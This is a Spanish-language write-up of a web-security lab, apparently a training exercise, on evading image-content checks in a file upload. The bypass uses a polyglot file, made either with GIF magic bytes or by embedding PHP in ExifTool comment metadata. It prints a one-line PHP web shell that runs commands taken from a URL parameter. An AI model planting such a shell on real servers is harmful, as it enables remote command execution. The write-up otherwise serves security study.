En esta clase enfrentamos una protección más avanzada que inspecciona el contenido de los archivos subidos para asegurarse de que sean imágenes reales. Sin embargo, logramos evadir este control creando un archivo **polyglot**, es decir, un archivo que es a la vez una imagen válida y un script PHP.

Utilizando herramientas como ExifTool, incrustamos nuestro payload PHP en los metadatos de la imagen, específicamente en el campo de comentarios, y le damos una extensión .php. Aunque el servidor interpreta el archivo como una imagen, al acceder a él lo ejecuta como código, permitiéndonos recuperar el contenido del archivo secreto de Carlos.

Este enfoque demuestra cómo combinar formatos de archivo puede burlar validaciones aparentemente sólidas.

Solucion
nos logeamos y subimos el arhivo
![Pasted_image_20250830210153.png](Imagenes/Pasted_image_20250830210153.png)
ahora nos vamos al historico y mandamo al repeater la peticion get
ahora si nosotros ponesmo GIF8; el servidor va interpretar que estamos subiendo un archivo .git
![Pasted_image_20250830210525.png](Imagenes/Pasted_image_20250830210525.png)
![Pasted_image_20250830210627.png](Imagenes/Pasted_image_20250830210627.png)
otra opcion es la siguiente
descargamos una imagen
y verificamos los metadatos
![Pasted_image_20250830211346.png](Imagenes/Pasted_image_20250830211346.png)
y aqui la idea es agarra la parte de coment y ponerle el archivo php
<?php system($_GET['cmd']); ?>
![Pasted_image_20250830211652.png](Imagenes/Pasted_image_20250830211652.png)
![Pasted_image_20250830211730.png](Imagenes/Pasted_image_20250830211730.png)
ahora vamos a testearlo
![Pasted_image_20250830211832.png](Imagenes/Pasted_image_20250830211832.png)
y ya solo subimos el archivo y lo vemos
![Pasted_image_20250830212109.png](Imagenes/Pasted_image_20250830212109.png)
![Pasted_image_20250830212300.png](Imagenes/Pasted_image_20250830212300.png)
